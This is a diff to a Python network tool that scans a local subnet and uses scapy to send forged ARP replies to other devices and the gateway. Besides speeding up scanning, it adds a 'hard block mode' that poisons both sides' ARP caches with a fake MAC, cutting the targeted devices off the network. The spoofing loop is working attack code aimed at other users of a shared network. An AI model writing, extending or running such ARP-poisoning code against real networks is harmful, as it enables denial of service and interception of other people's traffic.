@@ -11,6 +11,7 @@ import struct
 import uuid
 import subprocess
 import re
+from concurrent.futures import ThreadPoolExecutor
 from dataclasses import dataclass, field
 from typing import Optional, Callable
 
@@ -64,6 +65,10 @@ class NetworkEngine:
         self._throttle_stop_events: dict[str, threading.Event] = {}
         self._scan_thread: Optional[threading.Thread] = None
         self._running = False
+        self._hostname_cache: dict[str, str] = {}
+        self._hostname_futures = {}
+        self._hostname_lock = threading.Lock()
+        self._hostname_executor = ThreadPoolExecutor(max_workers=8)
         self.on_devices_updated: Optional[Callable] = None
         self.on_status_changed: Optional[Callable] = None
 
@@ -188,37 +193,45 @@ class NetworkEngine:
         else:
             self._notify_status(f"Interface: {interface.display_name} ({interface.ip})")
 
-    def scan_network(self, callback: Optional[Callable] = None):
-        """Scan the network for devices using multiple methods."""
+    def scan_network(self, callback: Optional[Callable] = None, fast_mode: bool = True):
+        """Scan devices on the selected network interface."""
         if not self.interface:
             self._notify_status("ERROR: No interface selected!")
             return
 
         def _scan():
             self._notify_status("Scanning network (multi-method)...")
+            started_at = time.time()
             try:
                 # Method 1: ARP table from Windows (most reliable)
                 self._notify_status("Step 1/3: Reading ARP table...")
                 self._scan_arp_table()
 
-                # Method 2: Ping sweep to populate ARP table
-                self._notify_status("Step 2/3: Ping sweep...")
-                self._ping_sweep()
-
-                # Re-read ARP table after ping sweep
-                self._scan_arp_table()
-
-                # Method 3: Scapy ARP scan
+                # Method 2: Scapy ARP broadcast (fast first)
                 if SCAPY_AVAILABLE:
-                    self._notify_status("Step 3/3: ARP scan (scapy)...")
-                    self._scan_scapy_arp()
+                    self._notify_status("Step 2/3: ARP scan (scapy)...")
+                    if fast_mode:
+                        self._scan_scapy_arp(timeout=2, retry=1)
+                    else:
+                        self._scan_scapy_arp(timeout=4, retry=2)
+
+                # Method 3: Ping sweep fallback when quick discovery is too low
+                discovered_targets = len([
+                    d for d in self.devices.values()
+                    if not d.is_self and not d.is_gateway
+                ])
+                if not fast_mode or discovered_targets < 2:
+                    self._notify_status("Step 3/3: Ping sweep fallback...")
+                    self._ping_sweep(timeout_ms=250, workers=64)
+                    self._scan_arp_table()
 
                 # Resolve gateway MAC
                 self._resolve_gateway_mac()
 
                 device_count = len([d for d in self.devices.values()
                                    if not d.is_self and not d.is_gateway])
-                self._notify_status(f"✅ Found {device_count} devices on network")
+                elapsed = time.time() - started_at
+                self._notify_status(f"Found {device_count} devices on network ({elapsed:.1f}s)")
 
                 if self.on_devices_updated:
                     self.on_devices_updated()
@@ -238,7 +251,7 @@ class NetworkEngine:
         try:
             result = subprocess.run(
                 ["arp", "-a"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True, text=True, timeout=4,
                 creationflags=subprocess.CREATE_NO_WINDOW
             )
             if result.returncode != 0:
@@ -275,71 +288,30 @@ class NetworkEngine:
         except Exception as e:
             self._notify_status(f"ARP table scan error: {e}")
 
-    def _ping_sweep(self):
-        """Ping all IPs in subnet to populate ARP table."""
+    def _ping_sweep(self, timeout_ms: int = 250, workers: int = 64):
+        """Fast parallel ping sweep to warm ARP cache."""
         try:
             subnet_prefix = '.'.join(self.interface.ip.split('.')[:3])
+            ips = [f"{subnet_prefix}.{i}" for i in range(1, 255)]
 
-            # Use PowerShell parallel ping for speed
-            ps_cmd = f"""
-            $subnet = '{subnet_prefix}'
-            1..254 | ForEach-Object -Parallel {{
-                $ip = "$using:subnet.$_"
-                $ping = Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 1 -Quiet -ErrorAction SilentlyContinue
-                if ($ping) {{ Write-Output $ip }}
-            }} -ThrottleLimit 50
-            """
-
-            result = subprocess.run(
-                ["powershell", "-Command", ps_cmd],
-                capture_output=True, text=True, timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-
-            if result.returncode != 0:
-                # Fallback: simple sequential ping (fewer at a time)
-                self._ping_sweep_fallback()
-
-        except Exception:
-            self._ping_sweep_fallback()
-
-    def _ping_sweep_fallback(self):
-        """Fallback ping sweep using cmd ping."""
-        try:
-            subnet_prefix = '.'.join(self.interface.ip.split('.')[:3])
-            threads = []
-
-            def ping_ip(ip):
+            def ping_ip(ip: str):
                 try:
                     subprocess.run(
-                        ["ping", "-n", "1", "-w", "500", ip],
-                        capture_output=True, timeout=3,
+                        ["ping", "-n", "1", "-w", str(timeout_ms), ip],
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                        timeout=2,
                         creationflags=subprocess.CREATE_NO_WINDOW
                     )
                 except Exception:
                     pass
 
-            # Ping common ranges first
-            for i in range(1, 255):
-                ip = f"{subnet_prefix}.{i}"
-                t = threading.Thread(target=ping_ip, args=(ip,), daemon=True)
-                threads.append(t)
-                t.start()
-
-                # Limit concurrent threads
-                if len(threads) >= 50:
-                    for t in threads:
-                        t.join(timeout=2)
-                    threads.clear()
-
-            # Wait for remaining
-            for t in threads:
-                t.join(timeout=2)
-
+            with ThreadPoolExecutor(max_workers=workers) as pool:
+                list(pool.map(ping_ip, ips))
         except Exception:
             pass
 
-    def _scan_scapy_arp(self):
+    def _scan_scapy_arp(self, timeout: int = 4, retry: int = 2):
         """Scan using scapy ARP requests."""
         if not SCAPY_AVAILABLE:
             return
@@ -355,7 +327,7 @@ class NetworkEngine:
             iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
 
             answered, _ = srp(
-                packet, timeout=4, verbose=False, retry=2, iface=iface
+                packet, timeout=timeout, verbose=False, retry=retry, iface=iface
             )
 
             for sent, received in answered:
@@ -420,7 +392,7 @@ class NetworkEngine:
         is_gateway = (ip == self.interface.gateway_ip) if self.interface else False
         is_self = (ip == self.interface.ip) if self.interface else False
 
-        hostname = self._resolve_hostname(ip)
+        hostname = self._hostname_cache.get(ip, "Unknown")
 
         if ip in self.devices:
             dev = self.devices[ip]
@@ -439,6 +411,40 @@ class NetworkEngine:
                 is_self=is_self,
                 last_seen=time.time()
             )
+
+        if hostname == "Unknown":
+            self._queue_hostname_resolution(ip)
+
+    def _queue_hostname_resolution(self, ip: str):
+        """Resolve hostnames in background to avoid slowing down network scan."""
+        with self._hostname_lock:
+            if ip in self._hostname_cache:
+                return
+
+            pending = self._hostname_futures.get(ip)
+            if pending and not pending.done():
+                return
+
+            future = self._hostname_executor.submit(self._resolve_hostname, ip)
+            self._hostname_futures[ip] = future
+            future.add_done_callback(
+                lambda fut, target_ip=ip: self._on_hostname_resolved(target_ip, fut)
+            )
+
+    def _on_hostname_resolved(self, ip: str, future):
+        try:
+            hostname = future.result()
+        except Exception:
+            hostname = "Unknown"
+
+        with self._hostname_lock:
+            self._hostname_futures.pop(ip, None)
+            self._hostname_cache[ip] = hostname
+
+        if hostname != "Unknown" and ip in self.devices:
+            self.devices[ip].hostname = hostname
+            if self.on_devices_updated:
+                self.on_devices_updated()
 
     def _get_network_range(self) -> str:
         """Calculate the network range from interface IP and subnet mask."""
@@ -461,6 +467,14 @@ class NetworkEngine:
             return hostname
         except (socket.herror, socket.gaierror, OSError):
             return "Unknown"
+
+    def _blackhole_mac(self, ip: str) -> str:
+        """Generate a locally-administered fake MAC for hard block mode."""
+        try:
+            last_octet = int(ip.split('.')[-1]) & 0xFF
+        except Exception:
+            last_octet = 0
+        return f"02:00:00:00:00:{last_octet:02x}"
 
     def throttle_device(self, ip: str, level: int = 0):
         """
@@ -498,6 +512,7 @@ class NetworkEngine:
             gateway_ip = self.interface.gateway_ip
             target_mac = device.mac
             iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
+            spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else self.interface.mac
 
             while not stop_event.is_set():
                 try:
@@ -506,7 +521,8 @@ class NetworkEngine:
                         op=2,
                         pdst=ip,
                         hwdst=target_mac,
-                        psrc=gateway_ip
+                        psrc=gateway_ip,
+                        hwsrc=spoof_hwsrc
                     )
 
                     # Spoofed ARP: Tell gateway that target is at our MAC
@@ -514,7 +530,8 @@ class NetworkEngine:
                         op=2,
                         pdst=gateway_ip,
                         hwdst=self.interface.gateway_mac,
-                        psrc=ip
+                        psrc=ip,
+                        hwsrc=spoof_hwsrc
                     )
 
                     send(arp_to_target, verbose=False, count=3, iface=iface)
@@ -599,6 +616,10 @@ class NetworkEngine:
         """Clean up all spoofing before exit."""
         self._running = False
         self.restore_all()
+        try:
+            self._hostname_executor.shutdown(wait=False, cancel_futures=True)
+        except Exception:
+            pass
 
     def _notify_status(self, message: str):
         """Send status update."""
